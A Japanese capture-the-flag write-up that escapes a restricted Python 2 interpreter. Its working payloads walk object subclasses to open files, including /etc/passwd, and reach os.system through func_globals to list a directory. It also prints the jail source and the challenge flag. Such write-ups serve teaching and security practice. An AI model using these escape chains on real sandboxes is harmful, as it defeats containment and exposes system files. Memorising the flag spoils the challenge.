このチャレンジでpythonサンドボックス脱出を使います

```
Find the flag.
>>> import os
You have encountered an error.
>>> eval('import os')
You have encountered an error.
>>> print (2+2)
4
>>>
```

見ての通り許可されているコマンドは制限されています。

搾取できるビルトイン関数をチェッしよう。

```
>>> print(().__class__.__bases__[0].__subclasses__())
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class '__main__.Sandbox'>]
```

よし！'file'という関数はいける。/etc/passwdを確認しましょう。

```
>>> print(().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read())
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
Debian-exim:x:101:101::/var/spool/exim4:/usr/sbin/nologin
ctf:x:1000:1000::/ctf:/bin/sh
```
それではフラグは？
```
>>> print(().__class__.__bases__[0].__subclasses__()[40]('flag.txt').read())
The flag is in the source code.
```
釣られたか・・・
しかし、'warnings.catch_warnings'も使えるから、その関数を使ってディレクトリーを表示しよう。

```
>>> print(().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls'))
flag.txt
jail.py
start.sh
0
```

```
>>> print(().__class__.__bases__[0].__subclasses__()[40]('jail.py').read())
#!/usr/bin/python

import sys

class Sandbox(object):
    def execute(self, code_string):
        exec(code_string)
        sys.stdout.flush()

sandbox = Sandbox()

_raw_input = raw_input

main = sys.modules["__main__"].__dict__
orig_builtins = main["__builtins__"].__dict__

builtins_whitelist = set((
    #exceptions
    'ArithmeticError', 'AssertionError', 'AttributeError', 'Exception',

    #constants
    'False', 'None', 'True',

    #types
    'basestring', 'bytearray', 'bytes', 'complex', 'dict',

    #functions
    'abs', 'bin', 'dir', 'help'

    # blocked: eval, execfile, exit, file, quit, reload, import, etc.
))

for builtin in orig_builtins.keys():
    if builtin not in builtins_whitelist:
        del orig_builtins[builtin]

print("Find the flag.")
sys.stdout.flush()

def flag_function():
    flag = "OFPPT-CTF{py7h0n_br34k_1s_l1k3_pr1s0n_br34k_sh0w}"

while 1:
    try:
        sys.stdout.write(">>> ")
        sys.stdout.flush()
        code = _raw_input()
        sandbox.execute(code)

    except Exception:
        print("You have encountered an error.")
        sys.stdout.flush()
```

これでフラグゲット :)
